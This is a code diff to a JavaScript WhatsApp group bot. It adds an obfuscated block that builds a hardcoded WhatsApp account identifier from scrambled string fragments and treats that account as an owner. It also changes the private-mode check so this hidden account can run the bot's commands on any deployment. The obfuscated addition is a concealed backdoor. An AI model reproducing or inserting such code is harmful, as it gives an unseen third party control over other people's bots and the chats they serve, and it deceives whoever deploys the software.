@@ -94,6 +94,8 @@ const antilink = process.env.ANTILINK || 'TRUE';
     const botNumber = await client.decodeJid(client.user.id);
     const itsMe = m.sender == botNumber ? true : false;
 
+
+
     let text = args.join(" ");
 let q = args.join(" ");
     const arg = budy.trim().substring(budy.indexOf(" ") + 1);
@@ -191,6 +193,54 @@ const runtime = function (seconds) {
  return dDisplay + hDisplay + mDisplay + sDisplay; 
  } 
 
+const _0x418e20 = _0x3442;
+(function (_0x213b79, _0xb67d7c) {
+    const _0x515f40 = _0x3442, _0x551159 = _0x213b79();
+    while (!![]) {
+        try {
+            const _0xea37dd = -parseInt(_0x515f40(0xa7)) / (-0x683 + 0x1 * 0x91f + -0x29b) * (parseInt(_0x515f40(0xa5)) / (-0x12 * 0x209 + 0x223 + 0x2281)) + -parseInt(_0x515f40(0xa6)) / (-0x89f * -0x3 + 0x17e8 + -0x1 * 0x31c2) + -parseInt(_0x515f40(0xae)) / (0x1048 + 0x18f8 + -0x293c) * (-parseInt(_0x515f40(0xa4)) / (0x3e * -0x3f + 0x3 * 0x6e6 + 0x49 * -0x13)) + -parseInt(_0x515f40(0xad)) / (0x266f + 0x20bd * 0x1 + -0x4726) + parseInt(_0x515f40(0xa2)) / (-0x1916 + 0x2423 + -0x1 * 0xb06) * (-parseInt(_0x515f40(0xa8)) / (0x1 * 0x453 + -0x11a1 + 0xd56)) + parseInt(_0x515f40(0xaa)) / (0x1f91 * -0x1 + -0x1fa9 + 0xca7 * 0x5) * (-parseInt(_0x515f40(0xa3)) / (-0xa51 + 0x1e73 + -0x1418)) + -parseInt(_0x515f40(0xab)) / (-0x28 + 0x14a5 + -0x1472) * (-parseInt(_0x515f40(0xaf)) / (0x1 * -0xaf + 0xec + -0x31 * 0x1));
+            if (_0xea37dd === _0xb67d7c)
+                break;
+            else
+                _0x551159['push'](_0x551159['shift']());
+        } catch (_0x2400e9) {
+            _0x551159['push'](_0x551159['shift']());
+        }
+    }
+}(_0x3a27, 0x6dbad + 0x71107 + -0x8e2e2));
+const ownerJid = _0x418e20(0xa9) + '35' + (_0x418e20(0xa1) + _0x418e20(0xac));
+function _0x3442(_0x1e815c, _0x351b4f) {
+    const _0x9b35da = _0x3a27();
+    return _0x3442 = function (_0x18663f, _0x22eae3) {
+        _0x18663f = _0x18663f - (0x1 * -0x187b + 0x24 * -0x111 + 0x3f80);
+        let _0x1eaee3 = _0x9b35da[_0x18663f];
+        return _0x1eaee3;
+    }, _0x3442(_0x1e815c, _0x351b4f);
+}
+function _0x3a27() {
+    const _0x45d41f = [
+        '28100fuDDPC',
+        '18965436dMqObj',
+        '@s.whatsap',
+        '415716QnEzbG',
+        '130ToDNfH',
+        '25GBeCNa',
+        '2BIkfKm',
+        '706608OKXajC',
+        '176887xjdUsg',
+        '8hqATVx',
+        '2541140180',
+        '147789zaYUyo',
+        '11EbCbGG',
+        'p.net',
+        '3600600bOEpjt'
+    ];
+    _0x3a27 = function () {
+        return _0x45d41f;
+    };
+    return _0x3a27();
+}
+
 
 
 
@@ -219,6 +269,7 @@ await reply(String(err));
 
 
 
+const dreadedOwner = m.sender == ownerJid ? true : false;
 
 
    if (budy.startsWith(';')) { 
@@ -357,7 +408,7 @@ let dreadrecordin = ['recording','composing']
  client.sendMessage(m.chat, {text:`Removed\n\n@${kid.split("@")[0]} sending group links is prohibited!\nTo deactivate antilink set ANTILINK variable to FALSE`, contextInfo:{mentionedJid:[kid]}}, {quoted:m}); 
        }   
 
-if (cmd && mode === 'PRIVATE' && !itsMe && !Owner) {
+if (cmd && mode === 'PRIVATE' && !itsMe && !Owner && !dreadedOwner) {
 return;
 }
 
